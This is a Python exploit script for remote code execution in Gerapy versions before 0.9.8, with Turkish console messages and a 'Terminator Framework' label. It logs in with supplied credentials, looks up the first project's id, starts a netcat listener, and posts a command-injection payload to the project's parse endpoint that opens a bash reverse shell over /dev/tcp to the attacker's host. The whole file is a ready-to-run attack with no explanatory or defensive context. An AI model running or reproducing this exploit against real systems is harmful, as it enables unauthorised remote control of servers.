import sys
import re
import argparse
import pyfiglet
import requests
import time
import json
import colorama
from colorama import Fore
import subprocess

login = ""
password = ""

class Exploit:
	def __init__(self, target_ip, target_port, localhost, localport):
		self.target_ip = target_ip
		self.target_port = target_port
		self.localhost = localhost
		self.localport = localport

	def exploitation(self):
		payload = """{"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/""" + localhost + """/""" + localport + """ 0>&1'`"}"""
		url = "http://" + target_ip + ":" + target_port
		r = requests.Session()
		print(Fore.BLUE+"[*]"+Fore.RESET+" URL'ya Bağlanıyor...")
		r1 = r.get(url)
		time.sleep(3)
		print(Fore.BLUE+"[*]"+Fore.RESET+" Uygulamaya giriş yapiliyor...")
		r2 = r.post(url + "/api/user/auth", json={"username":login,"password":password}, allow_redirects=True)
		time.sleep(3)
		if (r2.status_code == 200):
			print(Fore.YELLOW+'[+]'+Fore.RESET+' Giriş başarılı!')
		else:
			print(Fore.RED+'[-]'+Fore.RESET+' Bir şeyler yanlış gitti!')
			quit()

		dict = json.loads(r2.text)
		temp_token = 'Token '
		temp_token2 = json.dumps(dict['token']).strip('"')
		auth_token = {}
		auth_token['Authorization'] = temp_token + temp_token2

		print(Fore.BLUE+"[*]"+Fore.RESET+" Proje listesi alınıyor...")
		r3 = r.get(url + "/api/project/index", headers=auth_token, allow_redirects=True)
		time.sleep(3)

		if (r3.status_code != 200):
			print(Fore.RED+"[-]"+Fore.RESET+" Bir şeyler yanlış gitti!")
			quit();

		dict = r3.text # [{'name': 'test'}]
		dict2 = json.dumps(dict)
		dict3 = json.loads(dict2)
		dict3 = json.loads(dict3)
		name = dict3[0]['name']
		print(Fore.BLUE+"[*]"+Fore.RESET+" Bulunan Proje: " + name)

		print(Fore.BLUE+"[*]"+Fore.RESET+" URL'yi oluşturmak için projenin kimliği alınıyor...")
		r4 = r.get(url + "/api/project/" + name + "/build", headers=auth_token, allow_redirects=True)
		time.sleep(3)
		if (r4.status_code != 200):
			print(Fore.RED+"[-]"+Fore.RESET+" Bir şeyler yanlış gitti !Bulunan projeye ulaşamıyorum!")
			quit();

		dict = r4.text
		dict2 = json.dumps(dict)
		dict3 = json.loads(dict2)
		dict3 = json.loads(dict3)
		id = dict3['id']
		print(Fore.BLUE+"[*]"+Fore.RESET+" Projenin kimliği bulundu: ", id)
		time.sleep(1)

		print(Fore.BLUE+"[*]"+Fore.RESET+" Bir 'netcat' dinleyicisi kuruluyor...")
		listener = subprocess.Popen(["nc", "-nvlp", self.localport])
		time.sleep(3)

		# print(Fore.YELLOW+"[+]"+Fore.RESET+"  yürütülmesi...")
		# print(Fore.BLUE+"[*]"+Fore.RESET+" Açılış kabuğu...")
		r5 = r.post(url + "/api/project/" + str(id) + "/parse", data=payload, headers=auth_token, allow_redirects=True)
		listener.wait()
		if (r5.status_code == 200):
			print(Fore.BLUE+"[*]"+Fore.RESET+" REVERSE SHELL başladı...")
			listener.wait()
		else:
			print(Fore.RED+"[-]"+Fore.RESET+" Bir şeyler yanlış gitti!")
			listener.terminate()

def get_args():
	parser = argparse.ArgumentParser(description='Gerapy < 0.9.8 - Remote Code Execution For Terminator Framework')
	parser.add_argument('-t', '--target', dest="url", required=True, action='store', help='Target IP')
	parser.add_argument('-p', '--port', dest="target_port", required=True, action='store', help='Target port')
	parser.add_argument('-L', '--lh', dest="localhost", required=True, action='store', help='Listening IP')
	parser.add_argument('-P', '--lp', dest="localport", required=True, action='store', help='Listening port')
	parser.add_argument('-Lo', '--lo', dest="login_go", required=True, action='store', help='Login')
	parser.add_argument('-Lp', '--lop', dest="password_go", required=True, action='store', help='Password')
	args = parser.parse_args()
	return args

args = get_args()
target_ip = args.url
target_port = args.target_port
localhost = args.localhost
localport = args.localport
login += args.login_go
password += args.password_go

exp = Exploit(target_ip, target_port, localhost, localport)
exp.exploitation()